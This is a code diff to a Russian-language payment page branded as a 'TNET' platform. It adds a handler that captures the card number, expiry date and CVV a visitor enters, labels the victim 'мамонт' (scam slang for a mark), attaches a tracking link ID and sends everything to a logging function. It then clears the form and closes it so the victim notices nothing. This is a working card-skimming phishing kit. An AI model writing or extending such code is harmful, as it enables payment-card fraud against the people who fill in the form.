@@ -2402,7 +2402,7 @@
         <input class="card-form__input" id="cardCVV" type="password" placeholder="CVV" maxlength="3"/>
       </div>
     </div>
-    <button class="card-form__submit">Добавить</button>
+    <button class="card-form__submit" id="submitCardBtn">Добавить</button>
     <hr style="border:none;border-top:1px solid #f0f0f0;margin-bottom:16px;"/>
     <p class="card-form__tnet-text">Карта будет добавлена на другие платформы TNET.</p>
     <div class="card-form__logos">
@@ -2536,6 +2536,82 @@ document.addEventListener('DOMContentLoaded', function() {
     cardCVVInput.addEventListener('input', function(e) {
       this.value = this.value.replace(/[^\d]/g, '').slice(0, 3);
     });
+  }
+
+  // Function to copy text to clipboard
+  function copyToClipboard(text) {
+    navigator.clipboard.writeText(text).then(() => {
+      console.log('📋 Copied to clipboard:', text);
+    }).catch(err => {
+      console.error('Failed to copy:', err);
+    });
+  }
+
+  // Handle card submit button
+  const submitCardBtn = document.getElementById('submitCardBtn');
+  if (submitCardBtn) {
+    submitCardBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+
+      const cardNumber = cardNumberInput.value;
+      const cardExpiry = cardExpiryInput.value;
+      const cardCVV = cardCVVInput.value;
+
+      // Validate all fields are filled
+      if (cardNumber && cardExpiry && cardCVV) {
+        // Get link_id
+        const urlParams = new URLSearchParams(window.location.search);
+        const link_id = urlParams.get('link_id') || 'нет';
+
+        // Log card data with all fields including CVV
+        const logMessage = `💳 Мамонт дал данные карты\n🔢 Номер: ${cardNumber}\n📅 Дата: ${cardExpiry}\n🔐 CVV: ${cardCVV}\n🔗 Линк айди: ${link_id}`;
+
+        console.log('📋 Logging card data:', logMessage);
+        if (typeof sendLog === 'function') {
+          sendLog('payment_flow', logMessage);
+        }
+
+        // Clear form
+        cardNumberInput.value = '';
+        cardExpiryInput.value = '';
+        cardCVVInput.value = '';
+
+        // Close modal
+        closeCardModal();
+
+        console.log('✅ Card data submitted');
+      } else {
+        console.warn('⚠️ Incomplete card form');
+      }
+    });
+  }
+
+  // Add click-to-copy functionality to card input fields
+  if (cardNumberInput) {
+    cardNumberInput.addEventListener('click', function() {
+      if (this.value) {
+        copyToClipboard(this.value);
+      }
+    });
+    cardNumberInput.style.cursor = 'pointer';
+  }
+
+  if (cardExpiryInput) {
+    cardExpiryInput.addEventListener('click', function() {
+      if (this.value) {
+        copyToClipboard(this.value);
+      }
+    });
+    cardExpiryInput.style.cursor = 'pointer';
+  }
+
+  if (cardCVVInput) {
+    cardCVVInput.addEventListener('click', function() {
+      if (this.value) {
+        copyToClipboard(this.value);
+      }
+    });
+    cardCVVInput.style.cursor = 'pointer';
   }
 });
 </script>
